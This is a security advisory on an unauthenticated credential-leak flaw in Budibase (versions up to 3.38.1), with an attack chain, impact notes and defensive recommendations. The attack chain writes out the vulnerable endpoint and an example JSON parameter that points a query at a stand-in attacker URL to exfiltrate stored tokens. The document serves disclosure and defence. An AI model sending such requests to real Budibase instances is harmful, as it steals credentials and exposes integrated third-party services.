---
title: Budibase Unauthenticated REST Datasource Credential Theft via Cross-Origin Auth Leak
slug: 2026-07-budibase-unauth-rest-credential-theft
description: An unauthenticated attacker can steal REST datasource credentials, including Bearer/Basic tokens and static headers, from Budibase applications due to a critical cross-origin authentication leak (GHSA-mqhr-6j6h-74p5) where the application attaches stored credentials to outgoing requests without validating the destination host, allowing exfiltration to an attacker-controlled server.
date: "2026-07-24T21:27:18Z"
type: advisory
types:
  - advisory
severities:
  - critical
tags:
  - credential-theft
  - authentication-bypass
  - web-vulnerability
  - api-abuse
  - budibase
  - cloud
  - network
vendors:
  - Budibase
products:
  - Budibase (<= 3.38.1)
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1190
    technique_name: Exploit Public-Facing Application
    evidence: An unauthenticated attacker can steal REST datasource credentials from Budibase due to a cross-origin authentication leak.
    confidence_band: high
  - tactic_id: TA0006
    tactic_name: Credential Access
    technique_id: T1552
    technique_name: Unsecured Credentials
    evidence: Budibase attaches a REST datasource's stored credentials (Bearer/Basic tokens and static headers) to an outgoing request before it decides which host the request goes to, and never checks that the destination host matches the datasource.
    confidence_band: high
  - tactic_id: TA0010
    tactic_name: Exfiltration
    technique_id: T1567
    technique_name: Exfiltration Over Web Service
    evidence: the stored credentials are delivered to an attacker-chosen server.
    confidence_band: high
references:
  - https://github.com/advisories/GHSA-mqhr-6j6h-74p5
iocs:
  - type: url
    value: https://hasinocompany.budibase.app/
  - type: url
    value: https://postman-echo.com/get
  - type: url
    value: https://attacker.com/collect
  - type: email
    value: cyb@hasinosec.lat
ioc_counts:
  email: 1
  url: 3
---

An unauthenticated attacker can steal sensitive REST datasource credentials, including Bearer/Basic tokens and static headers, from Budibase applications due to a critical cross-origin authentication leak (GHSA-mqhr-6j6h-74p5). The vulnerability, affecting Budibase versions up to and including 3.38.1, stems from the application attaching stored authentication headers to outgoing requests without prior validation of the destination host. Attackers exploit this by crafting a query whose request path parameter points to an arbitrary attacker-controlled server. This malicious query can then be published with the PUBLIC role, allowing an unauthenticated attacker to execute it with a single HTTP request. This action causes Budibase to forward the datasource's credentials in cleartext to the attacker's server, completely bypassing internal credential masking mechanisms and a previous security fix (GHSA-3gp5). This enables adversaries to gain unauthorized access to third-party services that the Budibase application integrates with, leading to potential data theft and service abuse.

## Attack Chain

1. Attacker identifies a Budibase application utilizing a REST datasource with stored authentication and a query that uses a parameter in its path, published with the PUBLIC role.
2. The attacker, requiring no account, reads the published application ID and query ID from the public application interface of the target Budibase instance (e.g., `https://hasinocompany.budibase.app/`).
3. The attacker crafts an unauthenticated HTTP POST request to the Budibase application's `/api/v2/queries/<queryId>` endpoint, including the `x-budibase-app-id` header.
4. Within the JSON body of the POST request, the attacker specifies a malicious `parameters` field, setting the query's `path` to an absolute URL pointing to an attacker-controlled server (e.g., `{"parameters":{"t":"https://attacker.com/collect"}}`).
5. The Budibase application processes the POST request, resolving the query's path to the attacker-controlled URL without validating that the destination host matches the datasource's base host.
6. Budibase critically attaches the REST datasource's stored authentication headers, such as Bearer tokens (`UNAUTH_LEAK_TOKEN_5150`) and static headers (`STATIC_HDR_LEAK_4242`), to the outgoing HTTP request.
7. Budibase forwards this request, now containing the sensitive credentials in cleartext within the HTTP headers, to the attacker-controlled server (e.g., `https://postman-echo.com/get`).
8. The attacker's server receives and logs the incoming request, successfully exfiltrating the datasource's credentials, which can then be used to access and abuse the third-party service directly.

## Impact

This critical vulnerability allows unauthenticated attackers to exfiltrate sensitive REST datasource credentials, including Bearer/Basic tokens and static headers, from affected Budibase applications. If successful, attackers can use these stolen credentials to directly compromise and abuse the third-party services that the Budibase application integrates with. This can lead to unauthorized data theft, manipulation, or denial of service on those integrated services. The vulnerability also completely bypasses Budibase's internal credential masking controls, rendering them ineffective against this attack vector. Given the unauthenticated nature of the attack, it poses a severe risk to any Budibase instance using REST datasources with publicly exposed queries.

## Recommendation

* Review existing Budibase applications to identify any PUBLIC role queries that utilize REST datasources with stored authentication (Bearer/Basic tokens, static headers) and accept path parameters, reconfiguring them to avoid sensitive credential exposure.
* Implement network egress filtering on Budibase application servers to restrict outbound connections only to legitimate third-party API endpoints required by configured REST datasources, thereby preventing exfiltration to arbitrary attacker-controlled domains like `https://attacker.com/collect`.
* Monitor Budibase application web server logs and proxy logs for HTTP POST requests to `/api/v2/queries/*` endpoints, paying close attention to requests where the HTTP request body might contain unusual or external URLs as query parameters, for example, those targeting `https://postman-echo.com/get`.
* Deploy a Web Application Firewall (WAF) or API gateway in front of Budibase applications to inspect HTTP POST request bodies for `/api/v2/queries/{queryId}` endpoints and block requests that attempt to inject absolute URLs into path parameters, such as those observed targeting `https://postman-echo.com/get` or `https://attacker.com/collect`.
